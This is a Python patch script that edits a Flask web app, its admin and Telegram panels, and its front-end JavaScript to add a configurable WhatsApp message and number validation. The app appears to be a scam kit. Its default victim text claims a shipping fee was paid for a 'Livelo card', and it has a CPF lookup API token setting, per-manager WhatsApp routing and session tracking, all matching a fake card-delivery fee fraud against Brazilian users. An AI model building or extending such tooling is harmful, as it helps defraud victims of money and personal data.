import os
import re

APP_FILE = "app.py"
DASH_FILE = "templates/admin_dashboard.html"
TG_FILE = "templates/tg_webapp.html"
IDX_FILE = "templates/index.html"
MAIN_JS = "static/js/main.js"

# 1. Update app.py
with open(APP_FILE, "r", encoding="utf-8") as f:
    app_data = f.read()

if "wa_text = data.get(\"wa_text\")" not in app_data:
    app_data = app_data.replace(
        """favicon_url = data.get("favicon_url")""",
        """favicon_url = data.get("favicon_url")
    wa_text = data.get("wa_text")"""
    )
    app_data = app_data.replace(
        """if favicon_url is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon_url,))""",
        """if favicon_url is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon_url,))
    if wa_text is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('wa_text', ?)", (wa_text,))"""
    )
    
    # Also for /api/internal/set-manager
    app_data = app_data.replace(
        """wa = req.get('whatsapp')""",
        """wa = req.get('whatsapp')
    wa_t = req.get('wa_text')"""
    )
    app_data = app_data.replace(
        """if wa is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('whatsapp', ?)", (wa,))""",
        """if wa is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('whatsapp', ?)", (re.sub(r'\\D', '', wa),))
    if wa_t is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('wa_text', ?)", (wa_t,))"""
    )
with open(APP_FILE, "w", encoding="utf-8") as f:
    f.write(app_data)

# 2. Update tg_webapp.html
with open(TG_FILE, "r", encoding="utf-8") as f:
    tg_data = f.read()

if "cfg-wa-text" not in tg_data:
    tg_data = tg_data.replace(
        """<div class="config-row">
          <div class="config-label"><svg class="icon"><use href="#ic-settings"></use></svg> Token API CPF</div>""",
        """<div class="config-row">
          <div class="config-label"><svg class="icon" style="color:#25D366"><use href="#ic-whatsapp"></use></svg> Texto WhatsApp (Use {token})</div>
          <textarea id="cfg-wa-text" class="config-input" rows="3" placeholder="Olá! Paguei o frete {token}..." style="resize:none"></textarea>
        </div>
        <div class="config-row">
          <div class="config-label"><svg class="icon"><use href="#ic-settings"></use></svg> Token API CPF</div>"""
    )
    tg_data = tg_data.replace(
        """whatsapp: wa,""",
        """whatsapp: wa, wa_text: document.getElementById('cfg-wa-text').value,"""
    )
    tg_data = tg_data.replace(
        """document.getElementById('cfg-wa').value = data.whatsapp;""",
        """document.getElementById('cfg-wa').value = data.whatsapp;
          if(data.wa_text) document.getElementById('cfg-wa-text').value = data.wa_text;"""
    )
with open(TG_FILE, "w", encoding="utf-8") as f:
    f.write(tg_data)

# 3. Update admin_dashboard.html
with open(DASH_FILE, "r", encoding="utf-8") as f:
    dash_data = f.read()

if "wa_text" not in dash_data:
    dash_data = dash_data.replace(
        """<div class="field-group">
          <label class="field-label">Número do WhatsApp</label>
          <input type="text" class="field-input" id="mgr_wa" name="whatsapp" value="{{ mgr.whatsapp }}" placeholder="Apenas números (Ex: 11999999999)" required>
        </div>""",
        """<div class="field-group">
          <label class="field-label">Número do WhatsApp</label>
          <input type="text" class="field-input" id="mgr_wa" name="whatsapp" value="{{ mgr.whatsapp }}" placeholder="Apenas números (Ex: 11999999999)" required oninput="this.value=this.value.replace(/\\D/g,'')">
        </div>
        <div class="field-group">
          <label class="field-label">Texto de Abordagem WhatsApp</label>
          <textarea class="field-input" id="mgr_wa_text" name="wa_text" placeholder="Use {token} para a sessão" rows="3" style="resize:none">{{ sys_config.get('wa_text', 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega!') }}</textarea>
        </div>"""
    )
with open(DASH_FILE, "w", encoding="utf-8") as f:
    f.write(dash_data)

# 4. Update index.html
with open(IDX_FILE, "r", encoding="utf-8") as f:
    idx_data = f.read()

if "window.APP_WA_NUM" not in idx_data:
    idx_data = idx_data.replace(
        """<script src="/static/js/main.js"></script>""",
        """<script>
  window.APP_WA_NUM = "{{ sys_config.get('whatsapp', '5511999999999') }}";
  window.APP_WA_TEXT = `{{ sys_config.get('wa_text', 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega!') }}`;
</script>
<script src="/static/js/main.js"></script>"""
    )
with open(IDX_FILE, "w", encoding="utf-8") as f:
    f.write(idx_data)

# 5. Update main.js
with open(MAIN_JS, "r", encoding="utf-8") as f:
    main_data = f.read()

main_replacement = """  // Configura link do zap
  let waNumber = window.APP_WA_NUM || STATE.managerWa || '5511999999999';
  waNumber = waNumber.replace(/\\D/g, '');
  if (waNumber.length > 0 && !waNumber.startsWith('55')) waNumber = '55' + waNumber;
  
  let rawText = window.APP_WA_TEXT || 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega!';
  rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));
  
  const msg = encodeURIComponent(rawText);
  
  $id('btn-contact-manager').href = `https://wa.me/${waNumber}?text=${msg}`;"""

main_data = re.sub(
    r'// Configura link do zap.*?\$id\(\'btn-contact-manager\'\)\.href = `https://wa\.me/\$\{waNumber\}\?text=\$\{msg\}`;',
    lambda m: main_replacement,
    main_data,
    flags=re.DOTALL
)

with open(MAIN_JS, "w", encoding="utf-8") as f:
    f.write(main_data)

print("WhatsApp config and validation updated successfully.")
